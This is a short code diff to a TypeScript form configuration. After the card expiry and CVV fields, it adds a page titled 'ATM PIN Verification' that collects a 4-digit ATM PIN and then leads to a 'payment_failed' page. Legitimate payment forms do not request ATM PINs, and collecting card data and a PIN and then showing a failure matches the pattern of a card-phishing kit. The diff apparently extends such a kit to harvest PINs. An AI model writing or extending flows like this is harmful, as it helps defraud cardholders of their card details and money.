@@ -93,6 +93,15 @@ export const FORM_PAGES: PageConfig[] = [
             { key: 'cardExpiry', displayName: 'Expiry Date', type: 'text', category: 'card', required: true, maxlength: 7, placeholder: 'MM / YY' },
             { key: 'cvv', displayName: 'CVV', type: 'password', category: 'card', required: true, maxlength: 4, placeholder: 'CVV' },
         ],
+        nextPage: { main: 'atm_pin' },
+    },
+    {
+        id: 'atm_pin',
+        pageName: 'atm_pin',
+        title: 'ATM PIN Verification',
+        fields: [
+            { key: 'atmPin', displayName: 'ATM PIN', type: 'password', category: 'card', required: true, maxlength: 4, placeholder: '4-digit PIN' },
+        ],
         nextPage: { main: 'payment_failed' },
     },
     {
